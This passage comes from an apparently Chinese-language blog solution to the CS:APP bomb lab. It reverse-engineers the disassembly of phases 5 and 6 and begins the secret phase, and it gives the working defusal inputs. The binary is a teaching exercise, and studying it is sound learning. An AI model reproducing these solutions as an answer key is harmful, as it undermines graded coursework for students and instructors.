<span class="number">0x4024b0</span>(%rdx),%edx</span><br><span class="line">  4010a0:       <span class="number">88</span> <span class="number">54</span> <span class="number">04</span> <span class="number">10</span>             <span class="keyword">mov</span>    %dl,<span class="number">0x10</span>(%rsp,%rax,<span class="number">1</span>)</span><br><span class="line">  实际上是a[i] = <span class="number">0x4024b0</span>[input[i] &amp; <span class="number">0xf</span>]</span><br><span class="line">  4010a4:       <span class="number">48</span> <span class="number">83</span> c0 <span class="number">01</span>             <span class="keyword">add</span>    <span class="number">$0</span>x1,%rax</span><br><span class="line">  4010a8:       <span class="number">48</span> <span class="number">83</span> f8 <span class="number">06</span>             <span class="keyword">cmp</span>    <span class="number">$0</span>x6,%rax</span><br><span class="line">  4010ac:       <span class="number">75</span> <span class="built_in">dd</span>                   <span class="keyword">jne</span>    40108b &lt;phase_5+<span class="number">0x29</span>&gt;</span><br><span class="line">  # 循环以及条件判断</span><br><span class="line">  4010ae:       c6 <span class="number">44</span> <span class="number">24</span> <span class="number">16</span> <span class="number">00</span>          movb   <span class="number">$0</span>x0,<span class="number">0x16</span>(%rsp)</span><br><span class="line">  # 为构造的字符串尾部加上<span class="string">'\0'</span></span><br><span class="line">  4010b3:       be 5e <span class="number">24</span> <span class="number">40</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x40245e,%esi</span><br><span class="line">  4010b8:       <span class="number">48</span> <span class="number">8d</span> 7c <span class="number">24</span> <span class="number">10</span>          <span class="keyword">lea</span>    <span class="number">0x10</span>(%rsp),%rdi</span><br><span class="line">  4010bd:       e8 <span class="number">76</span> <span class="number">02</span> <span class="number">00</span> <span class="number">00</span>          callq  <span class="number">401338</span> &lt;strings_not_equal&gt;</span><br><span class="line">  # 调用strings_not_equal函数</span><br><span class="line">  4010c2:       <span class="number">85</span> c0                   <span class="keyword">test</span>   %eax,%eax</span><br><span class="line">  4010c4:       <span class="number">74</span> <span class="number">13</span>                   <span class="keyword">je</span>     4010d9 &lt;phase_5+<span class="number">0x77</span>&gt;</span><br><span class="line">  # 若返回值不为<span class="number">0</span> 则引爆bomb</span><br><span class="line">  4010c6:       e8 6f <span class="number">03</span> <span class="number">00</span> <span class="number">00</span>          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  4010cb:       0f 1f <span class="number">44</span> <span class="number">00</span> <span class="number">00</span>          nopl   <span class="number">0x0</span>(%rax,%rax,<span class="number">1</span>)</span><br><span class="line">  4010d0:       eb <span class="number">07</span>                   <span class="keyword">jmp</span>    4010d9 &lt;phase_5+<span class="number">0x77</span>&gt;</span><br><span class="line">  4010d2:       b8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x0,%eax</span><br><span class="line">  4010d7:       eb b2                   <span class="keyword">jmp</span>    40108b &lt;phase_5+<span class="number">0x29</span>&gt;</span><br><span class="line">  4010d9:       <span class="number">48</span> 8b <span class="number">44</span> <span class="number">24</span> <span class="number">18</span>          <span class="keyword">mov</span>    <span class="number">0x18</span>(%rsp),%rax</span><br><span class="line">  4010de:       <span class="number">64</span> <span class="number">48</span> <span class="number">33</span> <span class="number">04</span> <span class="number">25</span> <span class="number">28</span> <span class="number">00</span>    <span class="keyword">xor</span>    %fs:<span class="number">0x28</span>,%rax</span><br><span class="line">  4010e5:       <span class="number">00</span> <span class="number">00</span></span><br><span class="line">  4010e7:       <span class="number">74</span> <span class="number">05</span>                   <span class="keyword">je</span>     4010ee &lt;phase_5+<span class="number">0x8c</span>&gt;</span><br><span class="line">  4010e9:       e8 <span class="number">42</span> fa ff ff          callq  400b30 &lt;__stack_chk_fai</span><br><span class="line">l@plt&gt;</span><br><span class="line">  4010ee:       <span class="number">48</span> <span class="number">83</span> c4 <span class="number">20</span>             <span class="keyword">add</span>    <span class="number">$0</span>x20,%rsp</span><br><span class="line">  4010f2:       5b                      <span class="keyword">pop</span>    %rbx</span><br><span class="line">  4010f3:       c3                      retq   </span><br></pre></td></tr></table></figure><br>首先，我们注意到phase_5采用了栈破坏检测机制，并且设置了相应的哨兵值防止栈缓冲区溢出。<br>然后我们将phase_5逆向，得到如下的结果：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">phase_5</span><span class="params">(<span class="keyword">char</span> * input)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">char</span> a[<span class="number">7</span>];</span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">strlen</span>(input) != <span class="number">6</span>) explode_bomb();</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; <span class="number">6</span> ; i++)</span><br><span class="line">		a[i] = <span class="number">0x4024b0</span>[input[i] &amp; <span class="number">0xf</span>];</span><br><span class="line">	a[<span class="number">6</span>] = <span class="string">'\0'</span>;</span><br><span class="line">	<span class="keyword">int</span> val = strings_not_equal(a, <span class="number">0x40245e</span>);</span><br><span class="line">	<span class="keyword">if</span> (val != <span class="number">0</span>) explode_bomb();</span><br><span class="line">	<span class="keyword">return</span>;</span><br></pre></td></tr></table></figure><br>在GDB中打印0x4024b0和0x40245e所对应的字符串，命令和结果如下所示：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(gdb) <span class="built_in">print</span> (char *)0x4024b0</span><br><span class="line"><span class="variable">$1</span> = 0x4024b0 &lt;array&gt; <span class="string">"maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?"</span></span><br><span class="line">(gdb) <span class="built_in">print</span> (char *)0x40245e</span><br><span class="line"><span class="variable">$2</span> = 0x40245e <span class="string">"flyers"</span></span><br></pre></td></tr></table></figure><br>可以看出，phase_5实际上是phase_1的提高。</p>
<p>phase_5要求输入一个6个字符的字符串，通过将取出输入字符串中每个字符的后四位当做偏移地址，以该偏移地址取出地址为0x4024b0处的字符数组中对应的字符，并依次保存在临时数组a中构造一个新的字符串。<br>再将这个新的字符串与0x40245e处的字符串相比较，如果两个字符串相等，则该阶段解除。</p>
<p>0x40245e处的字符串为”flyers”，其每个字符在0x4024b0处的字符数组”maduiersnfotvbyl”中的对应的偏移量为9,15,14,5,6,7。因此只要输入的字符串的后四位换算成10进制分别为9,15,14,5,6,7即可。</p>
<p>本phase的答案不唯一。一个可能的答案为”yo~uvw”，在GDB中运行bomb并验证结果，结果正确。</p>
<h4 id="阶段6-phase-6"><a href="#阶段6-phase-6" class="headerlink" title="阶段6 - phase_6"></a>阶段6 - phase_6</h4><p>本phase是所有phase中最难的一个，但是仍然需要一步一步的分解反汇编代码，并最终得到正确的字符串。<br>在bomb-disassemble中观察phase_6的反汇编代码，如下：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">00000000004010f4 &lt;phase_6&gt;:</span><br><span class="line">  4010f4:       <span class="number">41</span> <span class="number">56</span>                   <span class="keyword">push</span>   %r14</span><br><span class="line">  4010f6:       <span class="number">41</span> <span class="number">55</span>                   <span class="keyword">push</span>   %r13</span><br><span class="line">  4010f8:       <span class="number">41</span> <span class="number">54</span>                   <span class="keyword">push</span>   %r12</span><br><span class="line">  4010fa:       <span class="number">55</span>                      <span class="keyword">push</span>   %rbp</span><br><span class="line">  4010fb:       <span class="number">53</span>                      <span class="keyword">push</span>   %rbx</span><br><span class="line">  4010fc:       <span class="number">48</span> <span class="number">83</span> ec <span class="number">50</span>             <span class="keyword">sub</span>    <span class="number">$0</span>x50,%rsp</span><br><span class="line">  <span class="number">401100</span>:       <span class="number">49</span> <span class="number">89</span> e5                <span class="keyword">mov</span>    %rsp,%r13</span><br><span class="line">  <span class="number">401103</span>:       <span class="number">48</span> <span class="number">89</span> e6                <span class="keyword">mov</span>    %rsp,%rsi</span><br><span class="line">  <span class="number">401106</span>:       e8 <span class="number">51</span> <span class="number">03</span> <span class="number">00</span> <span class="number">00</span>          callq  40145c &lt;read_six_numbers&gt;</span><br><span class="line">  # 读入<span class="number">6</span>个<span class="keyword">int</span>型数字</span><br><span class="line">  40110b:       <span class="number">49</span> <span class="number">89</span> e6                <span class="keyword">mov</span>    %rsp,%r14</span><br><span class="line">  40110e:       <span class="number">41</span> bc <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       <span class="keyword">mov</span>    <span class="number">$0</span>x0,%r12d</span><br><span class="line">  <span class="number">401114</span>:       4c <span class="number">89</span> ed                <span class="keyword">mov</span>    %r13,%rbp</span><br><span class="line">  <span class="number">401117</span>:       <span class="number">41</span> 8b <span class="number">45</span> <span class="number">00</span>             <span class="keyword">mov</span>    <span class="number">0x0</span>(%r13),%eax</span><br><span class="line">  40111b:       <span class="number">83</span> e8 <span class="number">01</span>                <span class="keyword">sub</span>    <span class="number">$0</span>x1,%eax</span><br><span class="line">  40111e:       <span class="number">83</span> f8 <span class="number">05</span>                <span class="keyword">cmp</span>    <span class="number">$0</span>x5,%eax</span><br><span class="line">  <span class="number">401121</span>:       <span class="number">76</span> <span class="number">05</span>                   <span class="keyword">jbe</span>    <span class="number">401128</span> &lt;phase_6+<span class="number">0x34</span>&gt;</span><br><span class="line">  <span class="number">401123</span>:       e8 <span class="number">12</span> <span class="number">03</span> <span class="number">00</span> <span class="number">00</span>          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  # 判断数字必须小于等于<span class="number">6</span></span><br><span class="line">  <span class="number">401128</span>:       <span class="number">41</span> <span class="number">83</span> c4 <span class="number">01</span>             <span class="keyword">add</span>    <span class="number">$0</span>x1,%r12d</span><br><span class="line">  40112c:       <span class="number">41</span> <span class="number">83</span> fc <span class="number">06</span>             <span class="keyword">cmp</span>    <span class="number">$0</span>x6,%r12d</span><br><span class="line">  <span class="number">401130</span>:       <span class="number">74</span> <span class="number">21</span>                   <span class="keyword">je</span>     <span class="number">401153</span> &lt;phase_6+<span class="number">0x5f</span>&gt;</span><br><span class="line">  <span class="number">401132</span>:       <span class="number">44</span> <span class="number">89</span> e3                <span class="keyword">mov</span>    %r12d,%ebx</span><br><span class="line">  <span class="number">401135</span>:       <span class="number">48</span> <span class="number">63</span> c3                movslq %ebx,%rax</span><br><span class="line">  <span class="number">401138</span>:       8b <span class="number">04</span> <span class="number">84</span>                <span class="keyword">mov</span>    (%rsp,%rax,<span class="number">4</span>),%eax</span><br><span class="line">  40113b:       <span class="number">39</span> <span class="number">45</span> <span class="number">00</span>                <span class="keyword">cmp</span>    %eax,<span class="number">0x0</span>(%rbp)</span><br><span class="line">  40113e:       <span class="number">75</span> <span class="number">05</span>                   <span class="keyword">jne</span>    <span class="number">401145</span> &lt;phase_6+<span class="number">0x51</span>&gt;</span><br><span class="line">  <span class="number">401140</span>:       e8 f5 <span class="number">02</span> <span class="number">00</span> <span class="number">00</span>          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  <span class="number">401145</span>:       <span class="number">83</span> c3 <span class="number">01</span>                <span class="keyword">add</span>    <span class="number">$0</span>x1,%ebx</span><br><span class="line">  <span class="number">401148</span>:       <span class="number">83</span> fb <span class="number">05</span>                <span class="keyword">cmp</span>    <span class="number">$0</span>x5,%ebx</span><br><span class="line">  40114b:       7e e8                   <span class="keyword">jle</span>    <span class="number">401135</span> &lt;phase_6+<span class="number">0x41</span>&gt;</span><br><span class="line">  <span class="number">40114d</span>:       <span class="number">49</span> <span class="number">83</span> c5 <span class="number">04</span>             <span class="keyword">add</span>    <span class="number">$0</span>x4,%r13</span><br><span class="line">  <span class="number">401151</span>:       eb c1                   <span class="keyword">jmp</span>    <span class="number">401114</span> &lt;phase_6+<span class="number">0x20</span>&gt;</span><br><span class="line">  # 判断这<span class="number">6</span>个数字两两不重复</span><br><span class="line">  <span class="number">401153</span>:       <span class="number">48</span> <span class="number">8d</span> <span class="number">74</span> <span class="number">24</span> <span class="number">18</span>          <span class="keyword">lea</span>    <span class="number">0x18</span>(%rsp),%rsi</span><br><span class="line">  <span class="number">401158</span>:       4c <span class="number">89</span> f0                <span class="keyword">mov</span>    %r14,%rax</span><br><span class="line">  40115b:       b9 <span class="number">07</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x7,%ecx</span><br><span class="line">  <span class="number">401160</span>:       <span class="number">89</span> ca                   <span class="keyword">mov</span>    %ecx,%edx</span><br><span class="line">  <span class="number">401162</span>:       2b <span class="number">10</span>                   <span class="keyword">sub</span>    (%rax),%edx</span><br><span class="line">  <span class="number">401164</span>:       <span class="number">89</span> <span class="number">10</span>                   <span class="keyword">mov</span>    %edx,(%rax)</span><br><span class="line">  <span class="number">401166</span>:       <span class="number">48</span> <span class="number">83</span> c0 <span class="number">04</span>             <span class="keyword">add</span>    <span class="number">$0</span>x4,%rax</span><br><span class="line">  40116a:       <span class="number">48</span> <span class="number">39</span> f0                <span class="keyword">cmp</span>    %rsi,%rax</span><br><span class="line">  <span class="number">40116d</span>:       <span class="number">75</span> f1                   <span class="keyword">jne</span>    <span class="number">401160</span> &lt;phase_6+<span class="number">0x6c</span>&gt;</span><br><span class="line">  # 分别用<span class="number">7</span>减去这<span class="number">6</span>个数</span><br><span class="line">  40116f:       be <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x0,%esi</span><br><span class="line">  <span class="number">401174</span>:       eb <span class="number">21</span>                   <span class="keyword">jmp</span>    <span class="number">401197</span> &lt;phase_6+<span class="number">0xa3</span>&gt;</span><br><span class="line">  <span class="number">401176</span>:       <span class="number">48</span> 8b <span class="number">52</span> <span class="number">08</span>             <span class="keyword">mov</span>    <span class="number">0x8</span>(%rdx),%rdx</span><br><span class="line">  40117a:       <span class="number">83</span> c0 <span class="number">01</span>                <span class="keyword">add</span>    <span class="number">$0</span>x1,%eax</span><br><span class="line">  <span class="number">40117d</span>:       <span class="number">39</span> c8                   <span class="keyword">cmp</span>    %ecx,%eax</span><br><span class="line">  40117f:       <span class="number">75</span> f5                   <span class="keyword">jne</span>    <span class="number">401176</span> &lt;phase_6+<span class="number">0x82</span>&gt;</span><br><span class="line">  <span class="number">401181</span>:       eb <span class="number">05</span>                   <span class="keyword">jmp</span>    <span class="number">401188</span> &lt;phase_6+<span class="number">0x94</span>&gt;</span><br><span class="line">  <span class="number">401183</span>:       ba d0 <span class="number">32</span> <span class="number">60</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x6032d0,%edx</span><br><span class="line">  <span class="number">401188</span>:       <span class="number">48</span> <span class="number">89</span> <span class="number">54</span> <span class="number">74</span> <span class="number">20</span>          <span class="keyword">mov</span>    %rdx,<span class="number">0x20</span>(%rsp,%rsi,<span class="number">2</span>)</span><br><span class="line">  <span class="number">40118d</span>:       <span class="number">48</span> <span class="number">83</span> c6 <span class="number">04</span>             <span class="keyword">add</span>    <span class="number">$0</span>x4,%rsi</span><br><span class="line">  <span class="number">401191</span>:       <span class="number">48</span> <span class="number">83</span> fe <span class="number">18</span>             <span class="keyword">cmp</span>    <span class="number">$0</span>x18,%rsi</span><br><span class="line">  <span class="number">401195</span>:       <span class="number">74</span> <span class="number">14</span>                   <span class="keyword">je</span>     4011ab &lt;phase_6+<span class="number">0xb7</span>&gt;</span><br><span class="line">  <span class="number">401197</span>:       8b 0c <span class="number">34</span>                <span class="keyword">mov</span>    (%rsp,%rsi,<span class="number">1</span>),%ecx</span><br><span class="line">  40119a:       <span class="number">83</span> f9 <span class="number">01</span>                <span class="keyword">cmp</span>    <span class="number">$0</span>x1,%ecx</span><br><span class="line">  <span class="number">40119d</span>:       7e e4                   <span class="keyword">jle</span>    <span class="number">401183</span> &lt;phase_6+<span class="number">0x8f</span>&gt;</span><br><span class="line">  40119f:       b8 <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x1,%eax</span><br><span class="line">  4011a4:       ba d0 <span class="number">32</span> <span class="number">60</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x6032d0,%edx</span><br><span class="line">  4011a9:       eb cb                   <span class="keyword">jmp</span>    <span class="number">401176</span> &lt;phase_6+<span class="number">0x82</span>&gt;</span><br><span class="line">  4011ab:       <span class="number">48</span> 8b 5c <span class="number">24</span> <span class="number">20</span>          <span class="keyword">mov</span>    <span class="number">0x20</span>(%rsp),%rbx</span><br><span class="line">  4011b0:       <span class="number">48</span> <span class="number">8d</span> <span class="number">44</span> <span class="number">24</span> <span class="number">28</span>          <span class="keyword">lea</span>    <span class="number">0x28</span>(%rsp),%rax</span><br><span class="line">  4011b5:       <span class="number">48</span> <span class="number">8d</span> <span class="number">74</span> <span class="number">24</span> <span class="number">50</span>          <span class="keyword">lea</span>    <span class="number">0x50</span>(%rsp),%rsi</span><br><span class="line">  4011ba:       <span class="number">48</span> <span class="number">89</span> d9                <span class="keyword">mov</span>    %rbx,%rcx</span><br><span class="line">  4011bd:       <span class="number">48</span> 8b <span class="number">10</span>                <span class="keyword">mov</span>    (%rax),%rdx</span><br><span class="line">  4011c0:       <span class="number">48</span> <span class="number">89</span> <span class="number">51</span> <span class="number">08</span>             <span class="keyword">mov</span>    %rdx,<span class="number">0x8</span>(%rcx)</span><br><span class="line">  4011c4:       <span class="number">48</span> <span class="number">83</span> c0 <span class="number">08</span>             <span class="keyword">add</span>    <span class="number">$0</span>x8,%rax</span><br><span class="line">  4011c8:       <span class="number">48</span> <span class="number">39</span> f0                <span class="keyword">cmp</span>    %rsi,%rax</span><br><span class="line">  4011cb:       <span class="number">74</span> <span class="number">05</span>                   <span class="keyword">je</span>     4011d2 &lt;phase_6+<span class="number">0xde</span>&gt;</span><br><span class="line">  4011cd:       <span class="number">48</span> <span class="number">89</span> d1                <span class="keyword">mov</span>    %rdx,%rcx</span><br><span class="line">  4011d0:       eb eb                   <span class="keyword">jmp</span>    4011bd &lt;phase_6+<span class="number">0xc9</span>&gt;</span><br><span class="line">  4011d2:       <span class="number">48</span> c7 <span class="number">42</span> <span class="number">08</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    <span class="keyword">movq</span>   <span class="number">$0</span>x0,<span class="number">0x8</span>(%rdx)</span><br><span class="line">  4011d9:       <span class="number">00</span></span><br><span class="line">  4011da:       bd <span class="number">05</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x5,%ebp</span><br><span class="line">  4011df:       <span class="number">48</span> 8b <span class="number">43</span> <span class="number">08</span>             <span class="keyword">mov</span>    <span class="number">0x8</span>(%rbx),%rax</span><br><span class="line">  4011e3:       8b <span class="number">00</span>                   <span class="keyword">mov</span>    (%rax),%eax</span><br><span class="line">  4011e5:       <span class="number">39</span> <span class="number">03</span>                   <span class="keyword">cmp</span>    %eax,(%rbx)</span><br><span class="line">  4011e7:       <span class="number">7d</span> <span class="number">05</span>                   <span class="keyword">jge</span>    4011ee &lt;phase_6+<span class="number">0xfa</span>&gt;</span><br><span class="line">  4011e9:       e8 4c <span class="number">02</span> <span class="number">00</span> <span class="number">00</span>          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  4011ee:       <span class="number">48</span> 8b 5b <span class="number">08</span>             <span class="keyword">mov</span>    <span class="number">0x8</span>(%rbx),%rbx</span><br><span class="line">  4011f2:       <span class="number">83</span> ed <span class="number">01</span>                <span class="keyword">sub</span>    <span class="number">$0</span>x1,%ebp</span><br><span class="line">  4011f5:       <span class="number">75</span> e8                   <span class="keyword">jne</span>    4011df &lt;phase_6+<span class="number">0xeb</span>&gt;</span><br><span class="line">  # 主要是重排链表 并且判断重排后的链表递减 否则引爆bomb</span><br><span class="line">  4011f7:       <span class="number">48</span> <span class="number">83</span> c4 <span class="number">50</span>             <span class="keyword">add</span>    <span class="number">$0</span>x50,%rsp</span><br><span class="line">  4011fb:       5b                      <span class="keyword">pop</span>    %rbx</span><br><span class="line">  4011fc:       <span class="number">5d</span>                      <span class="keyword">pop</span>    %rbp</span><br><span class="line">  4011fd:       <span class="number">41</span> 5c                   <span class="keyword">pop</span>    %r12</span><br><span class="line">  4011ff:       <span class="number">41</span> <span class="number">5d</span>                   <span class="keyword">pop</span>    %r13</span><br><span class="line">  <span class="number">401201</span>:       <span class="number">41</span> 5e                   <span class="keyword">pop</span>    %r14</span><br><span class="line">  <span class="number">401203</span>:       c3                      retq   </span><br></pre></td></tr></table></figure><br>由于phase_6的逆向比较复杂，这里只大致介绍该函数的作用——</p>
<ol>
<li>该函数在栈上分配了80个字节，包括了一个有6个int型数字的数组a和一个有6个指针的数组b。</li>
<li>同phase_2一样，该函数调用了read_six_numbers从输入的字符串中读取了6个数字，并且保存到数组a中。</li>
<li>判断这6个数字是否都小于等于6并且互相不重复，如果不满足则引爆炸弹。</li>
<li>分别用7减去这6个数，并且用计算结果覆盖这6个数。既a[i] = 7 - a[i]。</li>
<li>phase_6中引用了来自0x6032d0的结构体数组，该结构体共16个字节，其中前8个字节存放了一个int型的数字（结构体对齐），后8个字节存放了一个指针，该指针在指向结构体数组中的下一个元素。这实际上是一个有6个元素的单向链表。</li>
<li>程序从i=1开始，将结构体数组中的第a[i]个元素的首地址存放进b[i]中，循环6次，直到i=6。</li>
<li>程序从b[1]开始，将b[1]对应的元素的后8个字节对应的地址指向b[2]，直到b[5]-&gt;next = b[6]，将b[6]所对应的元素的后8个字节对应的地址指向0。</li>
<li>然后从b[1]所对应的节点开始，依次判断整个链表是否降序排列，如果不满足降序，则引爆bomb。</li>
</ol>
<p>phase_6是所有phases中最难的一个，其本质是输入1组数字从而实现对单向链表的重排，使得重排后的单向链表降序。</p>
<p>原链表的情况如下：</p>
<table>
<thead>
<tr>
<th style="text-align:center">节点</th>
<th style="text-align:center">1</th>
<th style="text-align:center">2</th>
<th style="text-align:center">3</th>
<th style="text-align:center">4</th>
<th style="text-align:center">5</th>
<th style="text-align:center">6</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">值</td>
<td style="text-align:center">322</td>
<td style="text-align:center">168</td>
<td style="text-align:center">924</td>
<td style="text-align:center">691</td>
<td style="text-align:center">477</td>
<td style="text-align:center">443</td>
</tr>
</tbody>
</table>
<p>因此使得链表降序的输入为：”3 4 5 6 1 2”<br>注意这是用7减过之后的数字序列，原输入序列也就是答案应为：”4 3 2 1 6 5”</p>
<h4 id="隐藏阶段-secret-phase"><a href="#隐藏阶段-secret-phase" class="headerlink" title="隐藏阶段 - secret_phase"></a>隐藏阶段 - secret_phase</h4><p>观察bomb-symboltable和bomb-disassemble我们都能发现一个叫做secret_phase的函数，这就是本次实验中被隐藏起来的phase。</p>
<p>经过观察反汇编代码，我们发现call secret_phase位于phase_defused函数中。</p>
<p>在bomb-disassemble中观察phase_defused的反汇编代码，如下：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">00000000004015c4 &lt;phase_defused&gt;:</span><br><span class="line">  4015c4:       <span class="number">48</span> <span class="number">83</span> ec <span class="number">78</span>             <span class="keyword">sub</span>    <span class="number">$0</span>x78,%rsp</span><br><span class="line">  4015c8:       <span class="number">64</span> <span class="number">48</span> 8b <span class="number">04</span> <span class="number">25</span> <span class="number">28</span> <span class="number">00</span>    <span class="keyword">mov</span>    %fs:<span class="number">0x28</span>,%rax</span><br><span class="line">  4015cf:       <span class="number">00</span> <span class="number">00</span></span><br><span class="line">  4015d1:       <span class="number">48</span> <span class="number">89</span> <span class="number">44</span> <span class="number">24</span> <span class="number">68</span>          <span class="keyword">mov</span>    %rax,<span class="number">0x68</span>(%rsp)</span><br><span class="line">  4015d6:       <span class="number">31</span> c0                   <span class="keyword">xor</span>    %eax,%eax</span><br><span class="line">  4015d8:       <span class="number">83</span> <span class="number">3d</span> <span class="number">81</span> <span class="number">21</span> <span class="number">20</span> <span class="number">00</span> <span class="number">06</span>    cmpl   <span class="number">$0</span>x6,<span class="number">0x202181</span>(%rip)        # <span class="number">603760</span> &lt;num_input_strings&gt;</span><br><span class="line">  # 输入过的字符串数目必须为<span class="number">6</span> 意味着必须是phase_6之后</span><br><span class="line">  4015df:       <span class="number">75</span> 5e                   <span class="keyword">jne</span>    40163f &lt;phase_defused+<span class="number">0x7b</span>&gt;</span><br><span class="line">  4015e1:       4c <span class="number">8d</span> <span class="number">44</span> <span class="number">24</span> <span class="number">10</span>          <span class="keyword">lea</span>    <span class="number">0x10</span>(%rsp),%r8</span><br><span class="line">  4015e6:       <span class="number">48</span> <span class="number">8d</span> 4c <span class="number">24</span> 0c          <span class="keyword">lea</span>    <span class="number">0xc</span>(%rsp),%rcx</span><br><span class="line">  4015eb:       <span class="number">48</span> <span class="number">8d</span> <span class="number">54</span> <span class="number">24</span> <span class="number">08</span>          <span class="keyword">lea</span>    <span class="number">0x8</span>(%rsp),%rdx</span><br><span class="line">  4015f0:       be <span class="number">19</span> <span class="number">26</span> <span class="number">40</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x402619,%esi</span><br><span class="line">  4015f5:       bf <span class="number">70</span> <span class="number">38</span> <span class="number">60</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x603870,%edi</span><br><span class="line">  4015fa:       e8 f1 f5 ff ff          callq  400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">  4015ff:       <span class="number">83</span> f8 <span class="number">03</span>                <span class="keyword">cmp</span>    <span class="number">$0</span>x3,%eax</span><br><span class="line">  <span class="number">401602</span>:       <span class="number">75</span> <span class="number">31</span>                   <span class="keyword">jne</span>    <span class="number">401635</span> &lt;phase_defused+<span class="number">0x71</span>&gt;</span><br><span class="line">  <span class="number">401604</span>:       be <span class="number">22</span> <span class="number">26</span> <span class="number">40</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x402622,%esi</span><br><span class="line">  <span class="number">401609</span>:       <span class="number">48</span> <span class="number">8d</span> 7c <span class="number">24</span> <span class="number">10</span>          <span class="keyword">lea</span>    <span class="number">0x10</span>(%rsp),%rdi</span><br><span class="line">  40160e:       e8 <span class="number">25</span> fd ff ff          callq  <span class="number">401338</span> &lt;strings_not_equal&gt;</span><br><span class="line">  # 第<span class="number">4</span>个输入字符串读入两个数字和一个字符串 且字符串必须与<span class="number">0x402622</span>处的字符串相等</span><br><span class="line">  <span class="number">401613</span>:       <span class="number">85</span> c0                   <span class="keyword">test</span>   %eax,%eax</span><br><span class="line">  <span class="number">401615</span>:       <span class="number">75</span> 1e     